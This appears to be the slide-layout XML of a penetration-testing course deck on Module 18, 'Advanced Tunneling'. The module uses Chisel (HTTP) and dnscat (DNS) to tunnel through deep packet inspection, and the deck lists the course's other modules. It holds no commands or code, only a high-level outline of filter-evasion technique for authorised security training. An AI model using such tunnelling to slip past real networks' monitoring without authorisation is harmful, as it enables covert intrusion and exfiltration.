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18. The shortest module in the syllabus — a single Learning Unit, four objectives. Do not pad it; the content genuinely is this compact.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unit, four objectives — the smallest module in the syllabus by unit count. Small does not mean unimportant; it is a genuinely narrow, specific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18 of 24. Directly follows Module 17 and precedes The Metasploit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Directly answers the question Module 17 raised but did not solve: what happens when traffic reaches its destination but is inspected and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the module's single unit. Four objectives: HTTP theory, HTTP practice, DNS theory, DNS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before the four objectives. Deep packet inspection examines traffic content, not just headers — that is exactly what these techniques must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18.1, task 1. HTTP tunnelling theory — why HTTP specifically is such a reliable carrier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18.1, task 2. Chisel named explicitly — the tool that performs HTTP tunnelling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18.1, task 3. DNS tunnelling theory — the fallback when even HTTP is filtered, since name resolution is even harder to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18.1, task 4. dnscat named explicitly — the tool that performs DNS tunnelling in practice, closing out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closing the module. Speed vs reliability is the trade-off, and choosing between them is the actual skill being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module's single unit before the applied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Five minutes in pairs. Listening for correct HTTP-first reasoning and correct diagnosis of when DNS becomes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1. Try HTTP before DNS — a direct, practical restatement of the module's central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2. Documenting the tunnelling chain used — direct continuation of Module 17's topology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Acronym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Misconceptions. The 'DNS is always better because it's stealthier' one is the most common and worth correcting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One unit, two named tools — the most compact module in the syllabus, and deliberately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Answer is B. Also appears as Q1 of the module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One unit, one line, stated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Preview Module 19 — from manual tunnelling and technique to a framework that automates much of what came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18 OF 24 · OFFSEC PEN-200 (PWK)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="1181100"/>
            <a:ext cx="18356580" cy="918195"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="25400" tIns="25400" rIns="25400" bIns="25400" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"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Advanced Tunneling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="2385045"/>
            <a:ext cx="13735050" cy="977205"/>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B8C0CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Tunnelling through deep packet inspection: HTTP tunnelling with Chisel, and DNS tunnelling with dnscat.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="9210675"/>
            <a:ext cx="16687800" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>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8" name="Text 6"/>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529013"/>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LEARNING OBJECTIVES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4024313"/>
            <a:ext cx="18356580" cy="618158"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="25400" tIns="25400" rIns="25400" bIns="25400" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="90896"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4350" b="1" spc="-37" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5F7FB"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What this module covers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4909170"/>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5090145"/>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5099670"/>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18.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1952625" y="5163964"/>
            <a:ext cx="5006853"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Tunneling Through Deep Packet Inspection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5956920"/>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single Learning Unit with four objectives: HTTP tunnelling theory and practice with Chisel, then DNS tunnelling theory and practice with dnscat.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="21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8797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COURSE CONTEXT · 24 LEARNING MODULES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="23750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Where Module 18 sits in PEN-200</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="80010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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="94297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942975" y="3399011"/>
            <a:ext cx="234225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General Course Introduction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500062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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350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5143500" y="3399011"/>
            <a:ext cx="242537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Cybersecurity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="920115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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934402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9344025" y="3399011"/>
            <a:ext cx="238541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Effective Learning Strategies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1340167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5" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354455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04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="13544550" y="3399011"/>
            <a:ext cx="312066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Report Writing for Penetration Testers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="80010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18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="94297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05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="942975" y="4215780"/>
            <a:ext cx="183118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Information Gathering</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500062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1" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350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06</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5143500" y="4215780"/>
            <a:ext cx="18587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Vulnerability Scanning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="920115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4" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934402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07</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9344025" y="4215780"/>
            <a:ext cx="270493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Web Applications</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1340167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7" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354455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08</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="13544550" y="4215780"/>
            <a:ext cx="28205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Common Web Application Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="80010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0" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="94297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09</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="942975" y="5032549"/>
            <a:ext cx="179419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SQL Injection Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500062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3" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350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10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5143500" y="5032549"/>
            <a:ext cx="161992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Client-Side Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="920115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6" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934402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11</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9344025" y="5032549"/>
            <a:ext cx="1980009"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Locating Public Exploits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Shape 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1340167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9" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354455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12</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="13544550" y="5032549"/>
            <a:ext cx="122351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Fixing Exploits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Shape 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="80010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2" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="94297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13</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="942975" y="5849317"/>
            <a:ext cx="144385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Antivirus Evasion</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Shape 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500062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5" name="Text 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350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14</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5143500" y="5849317"/>
            <a:ext cx="149981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Password Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Shape 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="920115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8" name="Text 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934402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15</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9344025" y="5849317"/>
            <a:ext cx="241280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Windows Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Shape 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1340167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51" name="Text 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354455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16</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="13544550" y="5849317"/>
            <a:ext cx="210405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Linux Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Shape 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="80010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4" name="Text 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="94297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17</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Text 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="942975" y="6666086"/>
            <a:ext cx="294774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Port Redirection and SSH Tunneling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Shape 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5000625" y="6308899"/>
            <a:ext cx="4086225" cy="702469"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16271"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6A00">
              <a:alpha val="12000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF6A00"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Text 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350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18</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="Text 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5143500" y="6666086"/>
            <a:ext cx="1867719" cy="252413"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110465"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1425" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5F7FB"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Advanced Tunneling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Shape 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="920115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0" name="Text 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934402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19</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Text 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9344025" y="6666086"/>
            <a:ext cx="221716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The Metasploit Framework</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="Shape 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1340167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3" name="Text 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354455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20</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Text 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="13544550" y="6666086"/>
            <a:ext cx="274839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 Introduction and Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Shape 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="80010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6" name="Text 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="94297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21</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="Text 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="942975" y="7482855"/>
            <a:ext cx="233935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Attacking AD Authentication</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Shape 66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500062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9" name="Text 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350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22</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Text 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5143500" y="7482855"/>
            <a:ext cx="199489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Lateral Movement in AD</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Shape 69"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="920115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2" name="Text 70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934402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23</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Text 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9344025" y="7482855"/>
            <a:ext cx="1893763"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Assembling the Pieces</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Shape 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1340167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5" name="Text 73"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354455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24</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Text 74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="13544550" y="7482855"/>
            <a:ext cx="200858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Trying Harder: The Labs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1425" dirty="0"/>
